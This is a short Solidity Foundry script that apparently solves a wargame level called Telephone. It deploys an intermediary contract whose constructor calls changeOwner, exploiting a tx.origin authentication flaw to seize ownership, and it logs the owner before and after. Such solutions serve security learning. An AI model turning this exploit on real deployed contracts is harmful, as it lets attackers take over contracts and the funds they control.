// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/script.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneDeployer is Script {
    Telephone telephone = Telephone(0xdf6b922f86Ac7286310Be50080de16139Fa84c56);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        //0xdf6b922f86Ac7286310Be50080de16139Fa84c56
        console.log("The owner before the attack is :", telephone.owner());
        new attack(telephone);
        console.log("The owner afte the attack is :", telephone.owner());
        //0x73de6b8e575D8B31A89568e9B3d0b3E89C25d8e5
        vm.stopBroadcast();
    }
}

contract attack {
    constructor(Telephone _telephone) {
        _telephone.changeOwner(msg.sender);
    }
}
